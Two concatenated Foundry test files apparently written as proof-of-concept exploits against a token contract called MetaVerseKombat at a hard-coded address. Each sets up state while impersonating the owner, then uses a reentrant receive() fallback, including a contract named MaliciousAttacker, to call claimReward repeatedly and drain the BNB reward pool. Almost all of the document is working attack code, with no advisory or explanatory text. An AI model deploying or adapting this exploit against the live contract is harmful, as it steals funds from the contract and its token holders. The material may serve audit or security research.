pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMetaVerseKombat {
    function claimReward() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 _minTokensBeforeSwap) external;
    function pancakePair() external view returns (address);
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function _rewardPool() external view returns (uint256);
    function unblockWalletAddress(address account) external;
    function update_MarketingWalletAddress(address _marketingWalletAddress) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;
    address attacker = address(this);
    IMetaVerseKombat victim = IMetaVerseKombat(payable(TARGET));
    uint public reentrancyCount = 0;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        deal(attacker, 10 ether);
                deal(TARGET, 10 ether);

                owner = victim.owner();
                vm.startPrank(owner);

                // FIX: Set a valid marketing wallet to prevent revert in swapAndLiquify
                victim.update_MarketingWalletAddress(address(0x1));

                victim.unblockWalletAddress(TARGET);

                victim.setSwapAndLiquifyEnabled(true, 1);

                victim.transfer(attacker, 100_000 * 1e18);

                address dummyUser = address(0xdeadbeef);
                victim.transfer(dummyUser, 100_000 * 1e18);

                victim.transfer(TARGET, 10_000 * 1e18);

                vm.stopPrank();

                vm.startPrank(dummyUser);
                victim.transfer(victim.pancakePair(), 10_000 * 1e18);
                vm.stopPrank();

                assertGt(TARGET.balance, 0, "Victim contract should have BNB for rewards");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        victim.claimReward();
    }

    // ─── Receive ETH for Reentrancy ──────────────────────────
    receive() external payable {
        if (reentrancyCount < 10) { 
            reentrancyCount++;
            if (TARGET.balance > 1 wei) {
                victim.claimReward();
            }
        }
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ContractWolf_Audit_Metaverse_Kombat {
    function claimReward() external;
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 _minTokensBeforeSwap) external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function _rewardPool() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function unblockWalletAddress(address _address) external;
    function excludedFromFee(address _address) external;
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousAttacker {
    ContractWolf_Audit_Metaverse_Kombat public target;
    uint256 public callCount;

    constructor(address _target) {
        target = ContractWolf_Audit_Metaverse_Kombat(_target);
    }

    function attack() external {
        callCount = 0;
        target.claimReward();
    }

    receive() external payable {
        callCount++;
        // Re-enter claimReward while state hasn't been updated yet
        // Limit reentrancy to prevent infinite loop
        if (callCount < 5 && address(target).balance > 0) {
            target.claimReward();
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    ContractWolf_Audit_Metaverse_Kombat target;
    MaliciousAttacker attacker;
    address constant TARGET = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ContractWolf_Audit_Metaverse_Kombat(TARGET);
        vm.label(TARGET, "Victim Contract");

        // Deploy attacker contract
        attacker = new MaliciousAttacker(TARGET);
        vm.label(address(attacker), "Attacker Contract");

        // Get owner address
        address owner = target.owner();

        // Unblock target contract address
        vm.startPrank(owner);
        target.unblockWalletAddress(TARGET);
        target.unblockWalletAddress(address(attacker));
        vm.stopPrank();

        // Transfer MVK tokens from owner to attacker contract
        vm.startPrank(owner);
        target.transfer(address(attacker), 100000 * 1e18);
        vm.stopPrank();

        // Enable swapAndLiquify as owner
        vm.startPrank(owner);
        target.setSwapAndLiquifyEnabled(true, 0);
        vm.stopPrank();

        // Fund target contract with BNB for reward pool
        vm.deal(TARGET, 50 ether);

        // Transfer some tokens to contract to accumulate balance for swapAndLiquify
        vm.startPrank(owner);
        target.transfer(TARGET, 10000 * 1e18);
        vm.stopPrank();

        // Trigger a transfer to pancakePair to trigger swapAndLiquify and populate _rewardPool
        // First exclude attacker from fee to avoid complications
        target.excludedFromFee(address(attacker));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(attacker).balance;

        // Execute the reentrancy attack
        attacker.attack();

        // Verify profit - attacker should have drained BNB from reward pool
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker did not profit from reentrancy attack");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

